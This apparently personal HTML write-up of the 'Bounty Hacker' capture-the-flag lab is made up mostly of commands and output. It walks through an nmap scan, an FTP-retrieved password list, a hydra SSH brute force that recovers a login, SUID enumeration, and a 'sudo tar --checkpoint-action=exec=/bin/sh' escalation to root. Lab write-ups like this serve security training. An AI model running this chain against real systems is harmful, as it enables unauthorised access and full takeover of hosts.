<!DOCTYPE html>
<html>
<head>
    <title>Bounty Hacker</title>
</head>
<body>
    <h1>Bounty Hacker</h1>
    <p>Welcome to the home page</p>


    <h2>Exploitation</h2>

    <p>
        sudo nmap -sV -sS -vv -p- 10.10.159.240 

        Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-25 19:06 CET
        NSE: Loaded 45 scripts for scanning.
        Initiating Ping Scan at 19:06
        Scanning 10.10.159.240 [4 ports]
        Completed Ping Scan at 19:06, 0.06s elapsed (1 total hosts)
        Initiating Parallel DNS resolution of 1 host. at 19:06
        Completed Parallel DNS resolution of 1 host. at 19:06, 13.00s elapsed
        Initiating SYN Stealth Scan at 19:06
        Scanning 10.10.159.240 [65535 ports]
        Discovered open port 21/tcp on 10.10.159.240
        Discovered open port 22/tcp on 10.10.159.240
        Discovered open port 80/tcp on 10.10.159.240
        SYN Stealth Scan Timing: About 24.20% done; ETC: 19:08 (0:01:37 remaining)
        SYN Stealth Scan Timing: About 49.87% done; ETC: 19:09 (0:01:13 remaining)
        SYN Stealth Scan Timing: About 76.95% done; ETC: 19:08 (0:00:31 remaining)
        Completed SYN Stealth Scan at 19:08, 126.84s elapsed (65535 total ports)
        Initiating Service scan at 19:08
        Scanning 3 services on 10.10.159.240
        Completed Service scan at 19:08, 6.12s elapsed (3 services on 1 host)
        NSE: Script scanning 10.10.159.240.
        NSE: Starting runlevel 1 (of 2) scan.
        Initiating NSE at 19:08
        Completed NSE at 19:08, 0.23s elapsed
        NSE: Starting runlevel 2 (of 2) scan.
        Initiating NSE at 19:08
        Completed NSE at 19:08, 0.18s elapsed
        Nmap scan report for 10.10.159.240
        Host is up, received reset ttl 63 (0.053s latency).
        Scanned at 2024-02-25 19:06:27 CET for 147s
        Not shown: 55529 filtered ports, 10003 closed ports
        Reason: 55529 no-responses and 10003 resets
        PORT   STATE SERVICE REASON         VERSION
        21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
        22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

        Read data files from: /usr/bin/../share/nmap
        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 146.80 seconds
        Raw packets sent: 176634 (7.772MB) | Rcvd: 10037 (401.492KB)

    </p>

    <p>
        ftp -a 10.10.159.240

        locks.txt  task.txt
    </p>

    <p>
        cat locks.txt

        rEddrAGON
        ReDdr4g0nSynd!cat3
        Dr@gOn$yn9icat3
        R3DDr46ONSYndIC@Te
        ReddRA60N
        R3dDrag0nSynd1c4te
        dRa6oN5YNDiCATE
        ReDDR4g0n5ynDIc4te
        R3Dr4gOn2044
        RedDr4gonSynd1cat3
        R3dDRaG0Nsynd1c@T3
        Synd1c4teDr@g0n
        reddRAg0N
        REddRaG0N5yNdIc47e
        Dra6oN$yndIC@t3
        4L1mi6H71StHeB357
        rEDdragOn$ynd1c473
        DrAgoN5ynD1cATE
        ReDdrag0n$ynd1cate
        Dr@gOn$yND1C4Te
        RedDr@gonSyn9ic47e
        REd$yNdIc47e
        dr@goN5YNd1c@73
        rEDdrAGOnSyNDiCat3
        r3ddr@g0N
        ReDSynd1ca7e
    </p>

    <p>
        hydra -l lin -P ./locks.txt ssh://10.10.159.240 
        Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-25 19:14:24
        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
        [DATA] attacking ssh://10.10.159.240:22/
        [22][ssh] host: 10.10.159.240   login: lin   password: RedDr4gonSynd1cat3
        1 of 1 target successfully completed, 1 valid password found
        [WARNING] Writing restore file because 1 final worker threads did not complete until end.
        [ERROR] 1 target did not resolve or could not be connected
        [ERROR] 0 target did not complete
        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-25 19:14:28
    </p>


    <p>
        find / -type f -perm /+s 2>/dev/null -exec ls -la {}  \;
        
        -rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
        -rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd
        -rwsr-xr-- 1 root dip 394984 Feb 11  2020 /usr/sbin/pppd
        -rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate
        -rwxr-sr-x 1 root tty 27368 May 16  2018 /usr/bin/wall
        -rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
        -rwxr-sr-x 1 root ssh 358624 Mar  4  2019 /usr/bin/ssh-agent
        -rwxr-sr-x 1 root shadow 62336 May 16  2017 /usr/bin/chage
        -rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab
        -rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
        -rwxr-sr-x 1 root shadow 22768 May 16  2017 /usr/bin/expiry
        -rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
        -rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
        -rwsr-xr-x 1 root root 23376 Mar 27  2019 /usr/bin/pkexec
        -rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
        -rwsr-xr-x 1 root root 136808 Jan 31  2020 /usr/bin/sudo
        -rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write
        -rwsr-xr-x 1 root root 14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
        -rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
        -rwsr-sr-x 1 root root 10584 Oct 25  2018 /usr/lib/xorg/Xorg.wrap
        -rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
        -rwxr-sr-x 1 root mail 14336 May 28  2019 /usr/lib/evolution/camel-lock-helper-1.2
        -rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        -rwsr-xr-x 1 root root 18664 Mar 17  2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
        -rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
        -rwsr-sr-x 1 root root 98472 Mar 18  2019 /usr/lib/snapd/snap-confine
        -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
        -rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
        -rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
        -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
        -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
        -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
    </p>

    <p>
        After some enumeration i found the following information:

        sudo -l
            Matching Defaults entries for lin on bountyhacker:
                env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

            User lin may run the following commands on bountyhacker:
                (root) /bin/tar

        and it seems that tar is vulnerable to privilege escalation, so by using the simple 

        sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

        we are now root
    </p>
</body>
</html>